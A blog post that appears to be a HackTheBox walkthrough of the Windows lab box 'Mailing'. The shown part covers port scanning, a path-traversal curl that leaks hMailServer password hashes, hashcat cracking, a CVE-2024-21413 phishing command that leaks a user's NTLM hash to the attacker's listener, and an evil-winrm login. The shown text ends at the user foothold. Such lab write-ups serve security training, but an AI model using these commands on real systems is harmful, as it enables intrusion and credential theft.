---
layout: post
title:  Mailing
description: Mailing - EASY Windows Box - This box focuses on the abuse of a outlook CVE to gain the foothold followed up with Libre Office Exploitation to gain admin access to dump hashes for a local admin user for root.
date:   2024-08-30 07:00:00 -0400
image:  '/images/mailing01.jpg'
tags:   [HackTheBox, CTF, Easy, Season 5 Anomaliess, Windows]
---
<div class="heading-wrapper">
    <h1 class="heading" id="Recon">Reconnaissance:</h1>
    <i class="fa-solid fa-frog" style="color: #b8bb26;"></i> Rust Scan
{% highlight Markdown %}
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
To scan or not to scan? That is the question.

[~] The config file is expected to be at "/home/froggiedrinks/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.129.39.59:25
Open 10.129.39.59:80
Open 10.129.39.59:110
Open 10.129.39.59:135
Open 10.129.39.59:143
Open 10.129.39.59:139
Open 10.129.39.59:465
Open 10.129.39.59:445
Open 10.129.39.59:587
Open 10.129.39.59:993
Open 10.129.39.59:5040
Open 10.129.39.59:5985
Open 10.129.39.59:7680
Open 10.129.39.59:47001
Open 10.129.39.59:49664
Open 10.129.39.59:49665
Open 10.129.39.59:49667
Open 10.129.39.59:49666
Open 10.129.39.59:49668
Open 10.129.39.59:55705
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} sC -sV -A" on ip 10.129.39.59
Depending on the complexity of the script, results may take some time to appear.
Failed to resolve "sC".
Failed to resolve "sC".
Failed to resolve "sC".
[~] Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-29 08:24 CDT
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 08:24
Completed NSE at 08:24, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 08:24
Completed NSE at 08:24, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 08:24
Completed NSE at 08:24, 0.00s elapsed
Initiating Ping Scan at 08:24
Scanning 10.129.39.59 [4 ports]
Completed Ping Scan at 08:24, 0.03s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 08:24
Completed Parallel DNS resolution of 1 host. at 08:24, 0.00s elapsed
DNS resolution of 1 IPs took 0.00s. Mode: Async [#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 08:24
Scanning 10.129.39.59 [20 ports]
Discovered open port 80/tcp on 10.129.39.59
Discovered open port 993/tcp on 10.129.39.59
Discovered open port 135/tcp on 10.129.39.59
Discovered open port 139/tcp on 10.129.39.59
Discovered open port 587/tcp on 10.129.39.59
Discovered open port 7680/tcp on 10.129.39.59
Discovered open port 143/tcp on 10.129.39.59
Discovered open port 110/tcp on 10.129.39.59
Discovered open port 445/tcp on 10.129.39.59
Discovered open port 25/tcp on 10.129.39.59
Discovered open port 465/tcp on 10.129.39.59
Discovered open port 49664/tcp on 10.129.39.59
Discovered open port 47001/tcp on 10.129.39.59
Discovered open port 55705/tcp on 10.129.39.59
Discovered open port 5985/tcp on 10.129.39.59
Discovered open port 49666/tcp on 10.129.39.59
Discovered open port 49668/tcp on 10.129.39.59
Discovered open port 49665/tcp on 10.129.39.59
Discovered open port 5040/tcp on 10.129.39.59
Discovered open port 49667/tcp on 10.129.39.59
Completed SYN Stealth Scan at 08:24, 0.04s elapsed (20 total ports)
Initiating Service scan at 08:24
Scanning 20 services on 10.129.39.59
Completed Service scan at 08:27, 156.43s elapsed (20 services on 1 host)
Initiating OS detection (try #1) against 10.129.39.59
Retrying OS detection (try #2) against 10.129.39.59
Initiating Traceroute at 08:27
Completed Traceroute at 08:27, 0.02s elapsed
Initiating Parallel DNS resolution of 2 hosts. at 08:27
Completed Parallel DNS resolution of 2 hosts. at 08:27, 0.00s elapsed
DNS resolution of 2 IPs took 0.00s. Mode: Async [#: 2, OK: 0, NX: 2, DR: 0, SF: 0, TR: 2, CN: 0]
NSE: Script scanning 10.129.39.59.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 08:27
NSE Timing: About 99.96% done; ETC: 08:27 (0:00:00 remaining)
Completed NSE at 08:28, 40.09s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 08:28
Completed NSE at 08:28, 1.49s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 08:28
Completed NSE at 08:28, 0.00s elapsed
Nmap scan report for 10.129.39.59
Host is up, received echo-reply ttl 127 (0.0085s latency).
Scanned at 2024-08-29 08:24:45 CDT for 203s

PORT      STATE SERVICE       REASON          VERSION
25/tcp    open  smtp          syn-ack ttl 127 hMailServer smtpd
| smtp-commands: mailing.htb, SIZE 20480000, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
80/tcp    open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Did not follow redirect to http://mailing.htb
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
110/tcp   open  pop3          syn-ack ttl 127 hMailServer pop3d
|_pop3-capabilities: USER UIDL TOP
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
143/tcp   open  imap          syn-ack ttl 127 hMailServer imapd
|_imap-capabilities: OK IMAP4rev1 ACL IDLE QUOTA NAMESPACE CHILDREN IMAP4 SORT completed CAPABILITY RIGHTS=texkA0001
445/tcp   open  microsoft-ds? syn-ack ttl 127
465/tcp   open  ssl/smtp      syn-ack ttl 127 hMailServer smtpd
--SNIP--
587/tcp   open  smtp          syn-ack ttl 127 hMailServer smtpd
| smtp-commands: mailing.htb, SIZE 20480000, STARTTLS, AUTH LOGIN PLAIN, HELP
--SNIP--
|_ssl-date: TLS randomness does not represent time
993/tcp   open  ssl/imap      syn-ack ttl 127 hMailServer imapd
--SNIP--
5040/tcp  open  unknown       syn-ack ttl 127
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
7680/tcp  open  pando-pub?    syn-ack ttl 127
47001/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
55705/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC

Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=258 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: Host: mailing.htb; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 25942/tcp): CLEAN (Timeout)
|   Check 2 (port 53596/tcp): CLEAN (Timeout)
|   Check 3 (port 59027/udp): CLEAN (Timeout)
|   Check 4 (port 48605/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-time: 
|   date: 2024-08-29T13:27:31
|_  start_date: N/A
|_clock-skew: 0s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

{% endhighlight %}
</div>

There is a lot of open ports on this box. Some noteworthy highlights are the following ports:
## Ports:
<ul class="checklist">
<li><i class="fa-solid fa-frog" style="color: #b8bb26;"></i> 25, 110, 143 - SMTP,IMAP and POP3. All mailing server ports. Appears to be some sort of mailing service setup on the box. We can see in our rust scan there is a service running <code>hMailServer</code>.</li>
<li><i class="fa-solid fa-frog" style="color: #b8bb26;"></i> 139, 445 - SMB Ports. There is SMB opened on this box.</li>
<li><i class="fa-solid fa-frog" style="color: #b8bb26;"></i> 80 - There is a website running.</li>
</ul>

# FFUFing:

I didnt discover much with fuzzing. Lets see if I can find anything with `Wapiti3`.

## Wapiti3:

Running `wapiti3` on our target we get an instant hit with `LFI` on the `/downloads` path.
<img src="/images/box-images/Mailing/Mailing_Wapiti3_LFI.png">

Curling down the path gives us proof that it indeed is vulnerable.

{% highlight markdown %}
curl "http://mailing.htb/download.php?file=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices"
{% endhighlight %}

We know we have `hMailServer` installed so lets see if we can find anything in that folder with the `LFI`

## LFI:
{% highlight markdown %}
curl "http://mailing.htb/download.php?file=../../../Program+Files+(x86)/hMailServer/Bin/hMailServer.INI"
{% endhighlight %}

Poking around we find a `.INI` file that contains setup information for the server.

{% highlight markdown %}
[Directories]
ProgramFolder=C:\Program Files (x86)\hMailServer
DatabaseFolder=C:\Program Files (x86)\hMailServer\Database
DataFolder=C:\Program Files (x86)\hMailServer\Data
LogFolder=C:\Program Files (x86)\hMailServer\Logs
TempFolder=C:\Program Files (x86)\hMailServer\Temp
EventFolder=C:\Program Files (x86)\hMailServer\Events
[GUILanguages]
ValidLanguages=english,swedish
[Security]
AdministratorPassword=841bb5acfa6779ae432fd7a4e6600ba7
[Database]
Type=MSSQLCE
Username=
Password=0a9f8ad8bf896b501dde74f08efd7e4c
PasswordEncryption=1
Port=0
Server=
Database=hMailServer
Internal=1
{% endhighlight %}

* Appears to be a md5 hash for a `AdministratorPassword`
    
    <i class="fa-solid fa-user-secret fa-2xl" style="color: #458588;"></i> `841bb5acfa6779ae432fd7a4e6600ba7`

* Save this hash to a file and run hashcat with `rockyou.txt` word list on it.
{%highlight markdown%} hashcat -m 0 hash /usr/share/wordlists/rockyou.txt {%endhighlight%}

* We successfully crack the hash with the password of:
    
    <i class="fa-solid fa-user-secret fa-2xl" style="color: #48588;"></i> `homenetworkingadministrator`

<img src=/images/box-images/Mailing/Mailing_HashCat_MailServer.png>

* Attempting to crack the second password
    * `0a9f8ad8bf896b501dde74f08efd7e4c` is proving to be more difficult.
* Im unable to crack it in hashcat but we did find a specific tool just for this case.
	* <a href="https://github.com/GitMirar/hMailDatabasePasswordDecrypter"></a>
	* Decrypting the password with this tool gives us `6FC6F69152AD`. Though Im not sure what to do with it at this moment.

### Port Connections:
* [n] Now that we have some creds lets see if we can connect to any of these ports with some generic admin/administrator usernames.

```
telnet boxIP 110
USER administrator@mailing.htb  
PASS homenetworkingadministrator  
LIST  
RETR 1
```

* We get some luck with `administrator@mailing.htb` with the administrator password. But it appears theres nothing in the mailbox.

<img src="/images/box-images/Mailing/Mailing_POP3_1.png">

* Going back to the website we can see an `download instrcutions` button at the bottom of the screen. It leads to a PDF you can download with instructions on home to connect to the mail server.
	* `http://mailing.htb/download.php?file=instructions.pdf`.

### Thunderbird:
* [n] Lets follow the instructions and setup `thunderbird` on our Linux box to connect to the mailbox.

* Using the found credentials for `administrator : homenetworkingadministrator` lets sign into the mailbox.

<img src="/images/box-images/Mailing/Mailing_IMAP_Thunderbird.png">

* We successfully login with this account.

<img src="/images/box-images/Mailing/Mailing_Thunderbird_Login_Success.png">

### Emailing:
* [n] Using the `instructions PDF` we notice at the end we are to email `maya@mailing.htb` to get a response from them. This is hinting at a `responder attack`. Lets see where it goes.

* Email `maya@mailing.htb`:
```
My first email!
Hi Maya! This is my first mail.
```

<img src="/images/box-images/Mailing/Mailing_Maya_Email.png">

* I waited around for awhile but never got a reply email. I have a sneaking suspicion they want us to setup `responder` and catch the reply back. Lets see if we can get any hits. We probably need to send a malicious email that will cause Maya to reach back to our server.
### CVE-2024-21413:
* [n] Looking around for `hMailServer / outlook ` vulnerabilities we stumble across a recent cve `cve-2024-21413` that looks promising.
	* https://sploitus.com/exploit?id=425B7616-AF36-5AD0-912F-A6B7A45E41E6
	* https://github.com/CMNatic/CVE-2024-21413

* We can use this CVE to send a bad email to Maya in hopes that when she clicks on the email it will cause them to reach back out to us and we can catch that information on `responder`.
	* `python3 CVE-2024-21413.py --server mailing.htb --port 587 --username administrator@mailing.htb --password homenetworkingadministrator --sender administrator@mailing.htb --recipient maya@mailing.htb --url '\\<ip>' --subject XD`

```
MAYA::MAILING:95de498996a31a8c:d2babc773ff653ee285d33e6fe5493a6:010100000000000080f2298488b6da015d1dcbb264e2490c0000000002000800530059005500490001001e00570049004e002d005a004f0042005000340036004d0038004b005600410004003400570049004e002d005a004f0042005000340036004d0038004b00560041002e0053005900550049002e004c004f00430041004c000300140053005900550049002e004c004f00430041004c000500140053005900550049002e004c004f00430041004c000700080080f2298488b6da0106000400020000000800300030000000000000000000000000200000c9e5bc0c7d84e948e12cf5d180e24c511c66b448ef8db310790edb6ad72669ff0a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00370031000000000000000000:m4y4ngs4ri
```

* We capture this NTLM hash from responder.
	* **NOTE:** If you use `pwnnbox` responder really doesn't work because the VNC has port 80 tied up and you cant start your responder server on port 80 so you cant capture HTTP traffic.

### Evil-WinRm:
* [n] We managed to dump a NTLM hash cred for `maya`.
	* `m4y4ngs4ri`
	* We can use this to `evil-winrm` onto the box and get our foothold
* `evil-winrm -i mailing.htb -u maya -p 'm4y4ngs4ri'`

* Cd to `Desktop` for the user flag.

<img src="/images/box-images/Mailing/Mailing_Maya_Foothold.png">